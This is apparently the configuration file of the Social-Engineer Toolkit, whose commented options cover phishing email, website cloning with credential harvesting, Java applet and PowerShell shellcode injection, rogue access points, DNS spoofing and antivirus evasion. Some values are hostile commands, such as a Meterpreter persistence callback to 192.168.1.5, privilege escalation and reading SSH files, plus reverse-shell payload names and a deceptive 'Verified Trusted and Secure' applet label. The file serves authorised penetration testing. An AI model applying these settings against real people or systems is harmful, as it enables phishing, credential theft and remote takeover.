#
### Define the path to Metasploit. For example: /opt/metasploit/apps/pro/msf3
METASPLOIT_PATH=/opt/metasploit/apps/pro/msf3
#
### This will tell what database to use when using Metasploit. The default is PostgreSQL.
METASPLOIT_DATABASE=postgresql
#
### Define how many times SET should encode a payload if you are using standard Metasploit encoding options.
ENCOUNT=4
#
### If this option is set, the Metasploit payloads will automatically migrate to
### Notepad once the applet is executed. This is beneficial if the victim closes
### the browser; however, this can introduce buggy results when auto migrating.
### Note that this will make bypassuac not work properly. Migrate to a different process to get it to work.
AUTO_MIGRATE=OFF
#
### Here, we can run multiple Meterpreter scripts once a session is active. This
### may be important if we are sleeping and need to run persistence, elevate
### permissions, or complete other tasks in an automated fashion. First, turn this trigger on, and
### then configure the options. Note that you need to separate the commands by a ';'.
METERPRETER_MULTI_SCRIPT=OFF
LINUX_METERPRETER_MULTI_SCRIPT=OFF
#
### Determine what commands you want to run once a Meterpreter session has been established.
### If you want multiple commands, separate them by a ';'. For example you could do
### "run getsystem;run hashdump;run persistence" to run three different commands.
METERPRETER_MULTI_COMMANDS=run persistence -r 192.168.1.5 -p 21 -i 300 -X -A;getsystem
LINUX_METERPRETER_MULTI_COMMANDS=uname;id;cat ~/.ssh/known_hosts
#
### This is the port that is used for iFrame injection when using the Metasploit browser attacks.
### By default, this port is 8080; however, egress filtering may block this. You may want to adjust to
### something like 21 or 53.
METASPLOIT_IFRAME_PORT=8080
#
### Define whether or not to use Ettercap for the website attack.
ETTERCAP=OFF
#
### Ettercap home directory (needed for DNS_spoof).
ETTERCAP_PATH=/usr/share/ettercap
#
### Specify what interface you want Ettercap or dsniff to listen on.
ETTERCAP_INTERFACE=eth0
#
### Define whether or not to use dsniff for the website attack.
### If dsniff is set to on, Ettercap will be automatically disabled.
DSNIFF=OFF
#
### Autodetection of IP address interface utilizing Google.
AUTO_DETECT=OFF
#
### Define whether or not to use Sendmail for spoofing emails. 
SENDMAIL=OFF
#
### The email providers supported are Gmail, Hotmail, and Yahoo.
EMAIL_PROVIDER=GMAIL
#
### Turn on if you want to use email in conjunction with the web attack.
WEBATTACK_EMAIL=OFF
#
### Web attack time delay between emails. The default is one second.
TIME_DELAY_EMAIL=1
#
### Use Apache instead of the standard Python web server. This will increase the speed
### of the attack vector.
APACHE_SERVER=OFF
#
### Path to the Apache web root.
APACHE_DIRECTORY=/var/www
#
### Specify what port to run the HTTP server on that serves the Java applet attack
### or Metasploit exploit. The default is port 80. If you are using Apache, you
### need to specify what port Apache is listening on in order for this to work properly.
WEB_PORT=80
#
### This flag will set the Java ID flag within the Java applet to something different.
### This could be to make it look more believable or for better obfuscation.
JAVA_ID_PARAM=Verified Trusted and Secure (VERIFIED)
#
### This option will continue to prompt the user with the Java applet if
### the user hits "cancel." This means the prompt will be non-stop until the applet is executed. This gives
### a better success rate for the Java applet attack.
JAVA_REPEATER=OFF
#
### This is the delay it takes between the user hitting "cancel" to
### when the next Java applet runs. Be careful with setting this too low as it will spawn them over
### and over even if they hit "run." 200 equals 2 seconds.
JAVA_TIME=200
#
### Turn on SSL/TLS certificates for secure SET communications through the web attack vector.
WEBATTACK_SSL=OFF
#
### Path to the PEM file to utilize certificates with the web attack vector (required).
### You can create your own utilizing SET â€“ just turn on SELF_SIGNED_CERT.
### If you're using this flag, ensure openSSL is installed! Turn SELF_SIGNED_CERT on. 
SELF_SIGNED_CERT=OFF
#
### Below is the client/server (private) cert; this must be in PEM format in order to work.
### Simply place the path you want. For example: /root/ssl_client/server.pem
PEM_CLIENT=/root/newcert.pem
PEM_SERVER=/root/newreq.pem
#
### Tweak the web jacking time used for the iFrame replace; sometimes it can be a little slow
### and harder to convince the victim. 5000 equals 5 seconds.
WEBJACKING_TIME=2000
#
### This will remove the SET interactive shell from the menu selection. The SET payloads are large in nature,
### and things like the Pwnie Express need smaller SET builds.
SET_INTERACTIVE_SHELL=ON
#
### These two options will turn the UPX packer on and automatically attempt
### to pack the executable which may evade anti-virus a little better.
UPX_ENCODE=OFF
UPX_PATH=/usr/bin/upx
#
### This will configure whether or not to use "EnableStageEncoding" within Metasploit payloads.
STAGE_ENCODING=OFF
#
### This feature will determine whether or not automatic redirection is used. By default, for example, in multi-attack,
### the site will redirect once one successful attack is used. Some people may want to use Java applet
### and credential harvester, for example.
AUTO_REDIRECT=ON
#
### This will redirect the harvester victim to this website once executed, rather than the original website.
### For example, if you clone "abcompany.com" and below it says "blahblahcompany.com," it will redirect there instead.
### This is useful if you want to redirect the victim to an additional site after harvester has taken the credentials.
### Simply enable harvester redirect, and then enter "http://websiteofyourchoosing.com" in the "HARVESTER_URL" below 
### to change.
HARVESTER_REDIRECT=OFF
HARVESTER_URL=http://thisisasite
#
### This will allow you to specify where the harvester log file goes when you use Apache. 
### By default, this will be in the "/var/www" directory.
HARVESTER_LOG=/var/www
#
### This will turn off the ability to log passwords in the credential harvester. Note that this isn't always
### reliable. It will only not present content that is password oriented. Otherwise, it will still
### show the content.
HARVESTER_LOG_PASSWORDS=ON
#
### This feature will auto embed an "img src" tag to a UNC path of your attack machine.
### This is useful if you want to intercept the half LM keys with rainbow tables. What will happen
### is as soon as the victim clicks the webpage link, a UNC path will be initiated,
### and the Metasploit "auxiliary/server/capture/smb" will intercept the hash values.
UNC_EMBED=OFF
#
### This feature will attempt to create a rogue access point and redirect victims back to the
### SET web server when associated.
ACCESS_POINT_SSID=linksys
AIRBASE_NG_PATH=/usr/local/sbin/airbase-ng
DNSSPOOF_PATH=/usr/local/sbin/dnsspoof
#
### This will configure the default channel that the wireless access point broadcasts through
### Wi-Fi communications.
AP_CHANNEL=9
#
### This will enable the PowerShell shellcode injection technique with each Java applet. It will be used as
### a second form in case the first method fails.
POWERSHELL_INJECTION=ON
#
### This will allow you to change the Metasploit payload to whatever you want based on the PowerShell alphanumeric
### injection attack. Specify this if PowerShell injection is enabled and you want to change it from the standard
### "reverse_https" attack. Note that all payloads use x86; the process will automatically downgrade to 32-bit.
POWERSHELL_INJECT_PAYLOAD_X86=windows/meterpreter/reverse_https
#
### This option will spray multiple ports through PowerShell in an effort to get a port outbound. 
### Note that PowerShell injection must be enabled.
POWERSHELL_MULTI_INJECTION=ON
#
### This will specify which ports to iterate through for the PowerShell injection. Note that if you are using SET,
### port 80 is used by the web server; the rest of ports should be open. If you want to use port 80,
### place the listener on a different server.
POWERSHELL_MULTI_PORTS=21,22,25,53,443
#
### This will display the output of the PowerShell injection attack so you can see what is being placed
### on the system.
POWERSHELL_VERBOSE=OFF
#
### This will profile the victim machine, check for installed versions, and report back on them.
### Note that this is currently disabled; development is underway on this feature.
WEB_PROFILER=OFF
#
### Port numbers for the Java applet Linux and OSX attacks; reverse payloads also allow you to specify
### what payload you want.
DEPLOY_OSX_LINUX_PAYLOADS=OFF
OSX_REVERSE_PORT=8080
LINUX_REVERSE_PORT=8081
OSX_PAYLOAD_DELIVERY=osx/x86/shell_reverse_tcp
LINUX_PAYLOAD_DELIVERY=linux/x86/meterpreter/reverse_tcp
#
### Determine whether or not to use a custom OSX and Linux payload.
CUSTOM_LINUX_OSX_PAYLOAD=OFF
#
### This will use a custom plist for persistence on OSX.
ENABLE_PERSISTENCE_OSX=OFF
#
### Determines what user agent string to use fo ranything that clones the website. 
USER_AGENT_STRING=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
#
### The SET interactive shell works by first deploying a stager payload that pulls an additional executable.
### The downloader is currently being picked up by anti-virus and is actually somewhat hard to obfuscate because it has 
### similar characteristics of a download and execute. If you turn this feature on, SET will download the interactive shell
### straight without using the stager. The only issue with this is that there may be a delay on the user's end, but it still 
### shouldn't be noticed.
SET_SHELL_STAGER=OFF
#
### Turn this off if you don't want a Metasploit listener in the background.
AUTOMATIC_LISTENER=ON
#
### This will disable Metasploit functionality if it is not installed, and you just want to use SET or RATTE for payloads
### or the other attack vectors.
METASPLOIT_MODE=ON
#
### This will turn off the deployment of binaries for the Java applet attack and only use the PowerShell method.
DEPLOY_BINARIES=NO
#
### This is for debugging purposes only. This will remove the cleanup functionality within SET to debug file states.
CLEANUP_ENABLED_DEBUG=OFF
#
### When sending out emails, SET will add a url and keep track of the email addresses on each unique link. This will help you find
### who clicked on the link. This works on all web-based and spear-phishing attacks.
### 
### Note that in order for this to work, you must enable "WEBATTACK_EMAIL" and "APACHE_SERVER".
TRACK_EMAIL_ADDRESSES=OFF
#
### This allows you to start a DNS server in SET. All responses will redirect to the SET instance which can launch attack vectors.
DNS_SERVER=OFF
#
### This will turn on bleeding edge repositories if you are using Kali Linux. Use at your own risk â€“ they tend to be unstable.
#
BLEEDING_EDGE=OFF
#
### This will download 1 deep the website with WGET instead of the standard. This may give better results but takes longer
WGET_DEEP=OFF
